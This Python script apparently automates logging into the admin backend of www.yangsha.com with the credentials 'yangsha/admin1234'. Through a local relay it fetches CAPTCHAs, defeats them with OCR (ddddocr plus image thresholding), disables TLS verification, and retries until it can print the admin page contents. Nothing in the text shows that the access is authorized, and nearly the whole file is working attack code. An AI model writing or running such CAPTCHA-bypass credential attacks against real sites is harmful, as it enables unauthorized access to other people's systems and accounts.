#!/usr/bin/env python3
"""verify_yangsha_sess.py - 通过sess_check.php验证yangsha/admin1234 (cookie会话)"""
import urllib.request, urllib.parse, ssl, re, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
HOST = 'http://127.0.0.1:13080'

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def fetch(url, timeout=30):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(50000)
    except Exception:
        return b''

dom = 'www.yangsha.com'
for attempt in range(15):
    out = fetch(HOST + '/getcap2.php?d=' + urllib.parse.quote(dom))
    if b'SAVED:' not in out:
        continue
    img = fetch(HOST + '/ys_cap2.jpg')
    if not img or len(img) < 50:
        continue
    try:
        c1 = ocr.classification(img)
        im = Image.open(io.BytesIO(img)).convert('L')
        im = im.resize((im.width * 6, im.height * 6), Image.LANCZOS)
        im = im.point(lambda p: 255 if p > 120 else 0)
        buf = io.BytesIO(); im.save(buf, 'PNG')
        c2 = ocrb.classification(buf.getvalue())
    except Exception:
        continue
    code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
    # sess_check: 登录+访问后台
    out = fetch(HOST + '/sess_check.php?d=' + urllib.parse.quote(dom) + '&p=' + urllib.parse.quote('admin1234') + '&c=' + code)
    idx = out.find(b'GIF89a')
    body = out[idx+6:] if idx > 0 else out
    text = body.decode('gb2312', 'ignore') if body else ''
    if '楠璇' in text or '确认码' in text or '验证码' in text:
        continue
    print('attempt %d:' % attempt, flush=True)
    print('  %s' % text[:600].replace(chr(10), ' '), flush=True)
    # 提取关键
    m_login = re.search(r'LOGIN_HEAD\|(.*?)\|BODY\|', text, re.S)
    m_admin = re.search(r'ADMINPAGE_LEN:(\d+)\|(.*)', text, re.S)
    if m_admin:
        print('  >>> ADMINPAGE len=%s content=%s' % (m_admin.group(1), m_admin.group(2)[:200].replace(chr(10), ' ')), flush=True)
    break
print('=== done ===')
